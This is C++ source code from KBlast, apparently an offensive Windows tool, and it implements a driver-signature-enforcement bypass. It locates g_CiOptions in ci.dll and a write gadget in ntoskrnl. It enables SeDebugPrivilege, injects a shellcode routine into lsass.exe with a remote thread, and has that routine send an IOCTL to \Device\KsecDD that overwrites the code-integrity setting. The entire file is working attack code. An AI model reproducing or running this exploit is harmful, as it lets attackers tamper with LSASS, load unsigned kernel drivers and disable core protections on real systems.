/*
* Author:	Angelo Frasca Caccia ( lem0nSec_ )
* Title:	KBlast.exe ( client )
* Website:	https://github.com/lem0nSec/KBlast
*/


#include "KBlast_c_ci.hpp"


#pragma optimize ("", off)
static BOOL WINAPI LsaKsec_SendIoctl()
{
	BOOL status = FALSE;
	IPC_SET_FUNCTION_RETURN_DEEP_PARAMETER InternalStruct = { 0x2121212121212121, 0x2222222222222222 };
	PIPC_SET_FUNCTION_RETURN_PARAMETER pParameterStruct = 0;
	PSYSTEM_HANDLE_INFORMATION pSystemHandleInformation = 0;
	POBJECT_NAME_INFORMATION pObjectNameInformation = 0;
	POBJECT_BASIC_INFORMATION pObjectBasicInformation = 0;
	ULONG szSystemInformationBuffer = sizeof(SYSTEM_HANDLE_INFORMATION), szObjectInformationBuffer = 0, iterator = 0;
	DWORD ObjectName[] = { 0x0044005c, 0x00760065, 0x00630069, 0x005c0065, 0x0073004b, 0x00630065, 0x00440044, 0x00000000 }; // L"\Device\KsecDD"

	pObjectBasicInformation = (POBJECT_BASIC_INFORMATION)((PLOCALALLOC)0x3131313131313131)(LPTR, sizeof(OBJECT_BASIC_INFORMATION));
	pParameterStruct = (PIPC_SET_FUNCTION_RETURN_PARAMETER)((PLOCALALLOC)0x3131313131313131)(LPTR, sizeof(IPC_SET_FUNCTION_RETURN_PARAMETER));

	if (pParameterStruct != NULL)
	{
		pParameterStruct->pInternalStruct = &InternalStruct;
		pParameterStruct->rdx = (ULONG)0;
		pParameterStruct->unk = (ULONG)0;

		while ((((PNTQUERYSYSTEMINFORMATION)0x4141414141414141)(0x10, (PVOID)pSystemHandleInformation, szSystemInformationBuffer, NULL)) != STATUS_SUCCESS)
		{
			if (pSystemHandleInformation)
			{
				((PLOCALFREE)0x3232323232323232)(pSystemHandleInformation);
				szSystemInformationBuffer *= 2;
			}
			pSystemHandleInformation = (PSYSTEM_HANDLE_INFORMATION)((PLOCALALLOC)0x3131313131313131)(LPTR, szSystemInformationBuffer);
			if (!pSystemHandleInformation)
			{
				break;
			}
		}

		if (pSystemHandleInformation)
		{
			for (iterator = 0; iterator < pSystemHandleInformation->HandleCount; iterator++)
			{
				if (pSystemHandleInformation->Handles[iterator].ProcessId == (ULONG)(*(PULONG)((PBYTE)__readgsqword(0x30) + 0x40)))
				{
					if (((PNTQUERYOBJECT)0x4242424242424242)((HANDLE)pSystemHandleInformation->Handles[iterator].Handle, ObjectBasicInformation, (PVOID)pObjectBasicInformation, sizeof(OBJECT_BASIC_INFORMATION), &szObjectInformationBuffer) == STATUS_SUCCESS)
					{
						if (!pObjectBasicInformation->NameInformationLength)
							szObjectInformationBuffer = MAX_PATH * sizeof(WCHAR);
						else
							szObjectInformationBuffer = pObjectBasicInformation->NameInformationLength;

						pObjectNameInformation = (POBJECT_NAME_INFORMATION)((PLOCALALLOC)0x3131313131313131)(LPTR, (SIZE_T)szObjectInformationBuffer);
						if (pObjectNameInformation)
						{
							((PNTQUERYOBJECT)0x4242424242424242)((HANDLE)pSystemHandleInformation->Handles[iterator].Handle, 1, (PVOID)pObjectNameInformation, szObjectInformationBuffer, &szObjectInformationBuffer);
							if (pObjectNameInformation->Name.Buffer != NULL)
							{
								if (((PWCSCMP)0x3333333333333333)((wchar_t*)pObjectNameInformation->Name.Buffer, (wchar_t*)ObjectName) == 0)
								{
									status = ((PDEVICEIOCONTROL)0x4343434343434343)((HANDLE)pSystemHandleInformation->Handles[iterator].Handle, 0x39006F, (LPVOID)pParameterStruct, (DWORD)sizeof(IPC_SET_FUNCTION_RETURN_PARAMETER), NULL, 0, NULL, NULL);
									if (status)
									{
										break;
									}
								}
							}
							((PLOCALFREE)0x3232323232323232)(pObjectNameInformation);
						}
					}
				}
			}
			if (pObjectNameInformation)
			{
				((PLOCALFREE)0x3232323232323232)(pObjectNameInformation);
			}
			((PLOCALFREE)0x3232323232323232)(pSystemHandleInformation);
		}
		((PLOCALFREE)0x3232323232323232)(pParameterStruct);
	}
	if (pObjectBasicInformation)
	{
		((PLOCALFREE)0x3232323232323232)(pObjectBasicInformation);
	}

	return status;

}
static BOOL WINAPI LsaKsec_SendIoctl_end()
{
	return 0;
}
#pragma optimize ("", on)


BOOL KBlast_c_ci_GetCiOptionsOffset(PULONG G_CIoptionsOffset)
{
	BOOL status = FALSE;
	ULONG64 CodeIntegrityModule = 0, CiInitialize = 0, CipInitialize = 0, g_ciOffset = 0, i = 0;
	ULONG CipOffset = 0, g_ciOffsetReal = 0;

	CodeIntegrityModule = (ULONG64)LoadLibraryEx(L"ci.dll", NULL, DONT_RESOLVE_DLL_REFERENCES);
	if (CodeIntegrityModule)
	{
		CiInitialize = (ULONG64)GetProcAddress((HMODULE)CodeIntegrityModule, "CiInitialize");
		if (CiInitialize)
		{
			i = CiInitialize;
			while ((*(PUSHORT)i) != 0xcccc)
			{
				i++;
			}

			i -= 1;

			while (TRUE)
			{
				if ((*(PUCHAR)i) == 0xe8)
				{
					i += 1;
					CipOffset = (ULONG)(*(PULONG)i);
					i += 4;
					CipInitialize = (ULONG64)(i + CipOffset);
					break;
				}
				i--;
			}

			i = CipInitialize;

			while (TRUE)
			{
				if ((*(PUSHORT)i) == 0x0d89)
				{
					i += 2;
					g_ciOffset = (ULONG64)((*(PULONG)i) + 0xffffffff00000000);
					i += 4;
					break;
				}
				i++;
			}

			g_ciOffsetReal = (ULONG)((i + g_ciOffset) - CodeIntegrityModule);

			__try
			{
				if (!(*(PULONG64)(CodeIntegrityModule + g_ciOffsetReal)))
				{
					*G_CIoptionsOffset = g_ciOffsetReal;
					status = TRUE;
				}
			}
			__except (EXCEPTION_EXECUTE_HANDLER)
			{
				status = FALSE;
			}
		}
		FreeLibrary((HMODULE)CodeIntegrityModule);
	}

	return status;

}

// Get gadget "mov qword ptr [rcx], rdx ; ret" in ntoskrnl.exe
static BOOL KBlast_c_ci_GetNtGadgetOffset(PULONG NtGadgetOffset)
{
	BOOL status = FALSE;
	PIMAGE_DOS_HEADER pIDH = 0;
	PIMAGE_OPTIONAL_HEADER pIOH = 0;
	PIMAGE_FILE_HEADER pIFH = 0;
	PIMAGE_NT_HEADERS pINH = 0;
	PIMAGE_SECTION_HEADER pISH = 0;
	HMODULE hNt = 0;
	LPVOID textSection = 0;
	DWORD i = 0, textSize = 0;

	hNt = LoadLibraryExW(L"C:\\Windows\\System32\\ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
	if ((hNt == INVALID_HANDLE_VALUE) || (hNt == 0))
		goto exit;

	pIDH = (PIMAGE_DOS_HEADER)hNt;
	pINH = (PIMAGE_NT_HEADERS)((PBYTE)hNt + pIDH->e_lfanew);
	pISH = (PIMAGE_SECTION_HEADER)((PBYTE)pINH + sizeof(IMAGE_NT_HEADERS));

	for (i = 0; i < pINH->FileHeader.NumberOfSections; i++)
	{
		if (strcmp((char*)pISH->Name, ".text") == 0)
		{
			textSection = (PBYTE)hNt + pISH->VirtualAddress;
			textSize = pISH->Misc.VirtualSize;
			break;
		}

		pISH = (PIMAGE_SECTION_HEADER)((PBYTE)pISH + sizeof(IMAGE_SECTION_HEADER));

	}

	if (!textSection || !textSize)
		goto exit;

	// 48 89 11 c3 : mov qword ptr [rcx], rdx
	for (i = 0; i < textSize; i++)
	{
		if ((*(PDWORD)((PBYTE)textSection + i)) == 0xc3118948)
		{
			*NtGadgetOffset = (ULONG)(((PBYTE)textSection + i) - (PBYTE)hNt);
			status = TRUE;
			break;
		}
	}


exit:
	if (hNt)
		FreeLibrary(hNt);

	return status;

}


static LPVOID KBlast_c_ci_ReplaceFakePointers(HANDLE hProcess, LPVOID buffer, DWORD DataSize, PREPLACEABLE_POINTER pReplPointers, DWORD count)
{
	LPVOID RemoteHandler = 0;
	BOOL status = FALSE;
	HMODULE hModule = 0;
	DWORD i = 0, j = 0;

	for (i = 0; i < count; i++)
	{
		if ((pReplPointers[i].RealPtr == NULL) && (pReplPointers[i].Module != NULL) && (pReplPointers[i].FakePtr != NULL) && (pReplPointers[i].Name != NULL))
		{
			hModule = GetModuleHandle(pReplPointers[i].Module);
			if (hModule == NULL)
			{
				hModule = LoadLibrary(pReplPointers[i].Module);
			}
			if (hModule != NULL)
			{
				pReplPointers[i].RealPtr = (PVOID)GetProcAddress(hModule, pReplPointers[i].Name);
			}
			else
				goto error;
		}
	}

	for (i = 0; i < count; i++)
	{
		if ((pReplPointers[i].FakePtr != NULL) && (pReplPointers[i].RealPtr == NULL))
			goto error;
	}

	for (i = 0; i < count; i++)
	{
		for (j = 0; j < DataSize - sizeof(PVOID); j++)
		{
			if (*(LPVOID*)((PBYTE)buffer + j) == pReplPointers[i].FakePtr)
			{
				*(LPVOID*)((PBYTE)buffer + j) = pReplPointers[i].RealPtr;
				j += sizeof(PVOID) - 1;
			}
		}
	}

	RemoteHandler = VirtualAllocEx(hProcess, NULL, DataSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (RemoteHandler)
	{
		if (!WriteProcessMemory(hProcess, RemoteHandler, buffer, DataSize, NULL))
		{
			VirtualFreeEx(hProcess, RemoteHandler, 0, MEM_RELEASE);
			goto error;
		}
	}

	return RemoteHandler;

error:
	return 0;

}


BOOL KBlast_c_ci_KexecDD()
{
	BOOL status = FALSE;
	LPVOID RemoteHandler = 0, LocalHandler = 0;
	SIZE_T szRemoteHandler = (SIZE_T)((PBYTE)LsaKsec_SendIoctl_end - (PBYTE)LsaKsec_SendIoctl);
	UINT64 ntoskrnl_gadget = 0;
	UINT64 ci_g_cioptions = 0;
	HANDLE hProcess = 0, hThread = 0;
	ULONG OffCiOptions = 0, OffNtGadget = 0;
	REPLACEABLE_POINTER ReplPointers[] = {
		{ L"kernel32.dll", "DeviceIoControl", (PVOID)0x4343434343434343, NULL},
		{ L"kernel32.dll", "LocalAlloc", (PVOID)0x3131313131313131, NULL },
		{ L"kernel32.dll", "LocalFree", (PVOID)0x3232323232323232, NULL },
		{ L"ntdll.dll", "wcscmp", (PVOID)0x3333333333333333, NULL },
		{ L"ntdll.dll", "NtQuerySystemInformation", (PVOID)0x4141414141414141, NULL },
		{ L"ntdll.dll", "NtQueryObject", (PVOID)0x4242424242424242, NULL },
		{ NULL, NULL, (PVOID)0x2121212121212121, NULL }, // gadget
		{ NULL, NULL, (PVOID)0x2222222222222222, NULL } // g_cioptions
	};
	DWORD FakePtrsCount = sizeof(ReplPointers) / sizeof(REPLACEABLE_POINTER), i = 0, lsa = 0;
	
	lsa = KBlast_c_utils_GetProcessIdByName(L"lsass.exe");
	if ((!(KBlast_c_ci_GetCiOptionsOffset(&OffCiOptions))) || (!(KBlast_c_ci_GetNtGadgetOffset(&OffNtGadget))))
	{
		PRINT_ERROR(L"Offsets not found.\n");
		return status;
	}
	else if (!lsa)
	{
		PRINT_ERROR(L"LSASS process ID not found.\n");
		return status;
	}
	else if (!KBlast_c_EnableTokenPrivilege(L"SeDebugPrivilege"))
	{
		PRINT_ERROR(L"SeDebugPrivilege - %08x\n", GetLastError());
		return status;
	}

	ntoskrnl_gadget = (UINT64)((PBYTE)KBlast_c_utils_GetDeviceDriverBaseAddress((LPSTR)"ntoskrnl.exe") + OffNtGadget);
	ci_g_cioptions = (UINT64)((PBYTE)KBlast_c_utils_GetDeviceDriverBaseAddress((LPSTR)"ci.dll") + OffCiOptions);

	if ((ntoskrnl_gadget > OffNtGadget) && (ci_g_cioptions > OffCiOptions))
	{
		PRINT_SUCCESS(L"ntoskrnl gadget\t- 0x%-016p\n", (PVOID)ntoskrnl_gadget);
		PRINT_SUCCESS(L"g_cioptions\t- 0x%-016p\n", (PVOID)ci_g_cioptions);
		for (i = 0; i < FakePtrsCount; i++)
		{
			if (ReplPointers[i].FakePtr == (PVOID)0x2121212121212121)
				ReplPointers[i].RealPtr = (PVOID)ntoskrnl_gadget;
			if (ReplPointers[i].FakePtr == (PVOID)0x2222222222222222)
				ReplPointers[i].RealPtr = (PVOID)ci_g_cioptions;
		}

		hProcess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION, FALSE, lsa);
		if ((hProcess != INVALID_HANDLE_VALUE) && (hProcess != 0))
		{
			PRINT_SUCCESS(L"lsass pid %d successfully opened.\n", lsa);
			LocalHandler = (LPVOID)LocalAlloc(LPTR, szRemoteHandler);
			if (LocalHandler)
			{
				RtlCopyMemory(LocalHandler, LsaKsec_SendIoctl, szRemoteHandler);
				RemoteHandler = KBlast_c_ci_ReplaceFakePointers(hProcess, LocalHandler, (DWORD)szRemoteHandler, (PREPLACEABLE_POINTER)&ReplPointers, FakePtrsCount);
				if (RemoteHandler != NULL)
				{
					PRINT_SUCCESS(L"Remote handler successfully injected.\n");
					hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)RemoteHandler, NULL, 0, NULL);
					if ((hThread != INVALID_HANDLE_VALUE) && (hThread != 0))
					{
						PRINT_SUCCESS(L"Remote thread successfully created.\n");
						WaitForSingleObject(hThread, INFINITE);
						CloseHandle(hThread);
						status = TRUE;
					}
					else
						PRINT_ERROR(L"Remote thread failure.\n");

					if (VirtualFreeEx(hProcess, RemoteHandler, 0, MEM_RELEASE))
						PRINT_SUCCESS(L"Target process cleaning success.\n");
					else
						PRINT_ERROR(L"Attempted to clean target process.\n");
				}
				else
					PRINT_ERROR(L"Handler injection error.\n");

				LocalFree(LocalHandler);
			}

			CloseHandle(hProcess);
		}
		else
			PRINT_ERROR(L"lsass - %08x\n", GetLastError());
	}

	return status;

}